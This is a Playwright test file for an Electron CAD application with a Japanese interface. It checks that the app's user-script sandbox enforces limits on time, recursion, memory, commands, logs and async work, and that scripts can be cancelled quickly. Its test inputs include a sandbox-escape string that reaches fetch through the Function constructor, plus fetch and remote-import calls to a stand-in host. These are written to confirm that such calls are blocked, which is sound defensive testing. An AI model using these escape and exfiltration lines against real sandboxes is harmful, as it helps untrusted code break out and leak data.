import { expect, type ElectronApplication, type Page, type TestInfo } from '@playwright/test';
import { chooseToolMenuItem } from './assemblyTestSupport.js';
import { panel, source, writeDraft, savePart, successfulRun } from './scriptsFlow.js';
import { readRecomputeStats } from './recompute.js';

export async function scriptLimitsFlow(page: Page, info: TestInfo, app?: ElectronApplication): Promise<void> {
  await page.setViewportSize({ width: 1440, height: 900 });
  await expect(page.getByRole('button', { name: '新規', exact: true })).toBeVisible();
  await chooseToolMenuItem(page, '自動作図', '自動作図');
  const baseline = await savePart(page, info, 'limits-original.pcad', app);
  const generation = (await readRecomputeStats(page)).requestedGeneration;
  const remote: string[] = [];
  const listener = (request: { url(): string }): void => { if (request.url().startsWith('https://example.invalid')) remote.push(request.url()); };
  page.context().on('request', listener);
  const failures = [
    { name: '時間', code: '// 本来の2行目\nwhile(true){}', message: /上限5秒/u, line: true },
    { name: '再帰', code: '// 本来の2行目\nfunction f(){return f()+1}try{f()}catch{}', message: /深さの上限/u, line: true },
    { name: 'メモリ', code: '// 本来の2行目\ntry{const a=[];while(true)a.push(new Array(100000).fill(1))}catch{}', message: /メモリ64MiB/u, line: true },
    { name: '命令数', code: '// 本来の2行目\ntry{for(let i=0;i<1001;i++)cad.solid.box({x:"1",y:"1",z:"1"})}catch{}', message: /上限/u, line: true },
    { name: 'ログ', code: 'try{for(let i=0;i<1001;i++)console.log(i)}catch{}', message: /上限/u, line: false },
    { name: '非同期', code: 'await new Promise(()=>{})', message: /完了しない非同期/u, line: false },
    { name: '外部module', code: 'await import("https://example.invalid/secret.js")', message: /ローカル/u, line: false },
    { name: '通信', code: '(function(){}).constructor("return fetch")()("https://example.invalid/secret")', message: /fetch/u, line: false },
  ];
  for (const failure of failures) {
    await writeDraft(page, failure.name, failure.code);
    await panel(page).getByRole('button', { name: '実行', exact: true }).first().click();
    await expect(panel(page).getByRole('alert')).toContainText(failure.message);
    if (failure.line) await expect(panel(page).getByRole('button', { name: /エラーの行へ移動 user-script.js:2/u })).toBeVisible();
    expect((await readRecomputeStats(page)).requestedGeneration).toBe(generation);
    expect(await savePart(page, info, `limits-${failure.name}.pcad`, app)).toEqual(baseline);
  }
  expect(remote).toEqual([]); page.context().off('request', listener);
  // UI cancellation latency is measured inside the actual pointer event and painted DOM.
  await writeDraft(page, '即時中止', 'while(true){}');
  await panel(page).getByRole('button', { name: '実行', exact: true }).first().click();
  await expect(panel(page).getByRole('status').filter({ hasText: /^処理を実行中$/u })).toBeVisible();
  const cancel = panel(page).getByRole('button', { name: '中止', exact: true });
  await cancel.evaluate(button => {
    button.addEventListener('pointerdown', () => {
      const started = performance.now();
      const region = button.closest('section'); if (region === null) throw new Error('missing panel');
      const observer = new MutationObserver(() => {
        if (!region.textContent?.includes('中止しました。文書は変更していません')) return;
        observer.disconnect(); requestAnimationFrame(() => { button.setAttribute('data-cancel-ms', String(performance.now() - started)); });
      });
      observer.observe(region, { subtree: true, childList: true, characterData: true });
    }, { once: true });
  });
  await cancel.click();
  await expect(cancel).toHaveAttribute('data-cancel-ms', /\d/u);
  const cancelMs = Number(await cancel.getAttribute('data-cancel-ms'));
  console.log(`[実測] 自動作図の中止表示 ${cancelMs.toFixed(1)} ms / 上限200ms`);
  expect(cancelMs).toBeLessThanOrEqual(200);
  // Editing source cancels an old execution before it can publish its document.
  await panel(page).getByRole('button', { name: '実行', exact: true }).first().click();
  await expect(panel(page).getByRole('status').filter({ hasText: /^処理を実行中$/u })).toBeVisible();
  await source(page).fill('cad.solid.box({x:"20",y:"20",z:"20"});');
  await expect(panel(page).getByRole('alert')).toContainText('コード');
  expect(await savePart(page, info, 'limits-stale.pcad', app)).toEqual(baseline);
  await successfulRun(page);
  expect((await savePart(page, info, 'limits-recovered.pcad', app)).solids).toHaveLength(1);
}
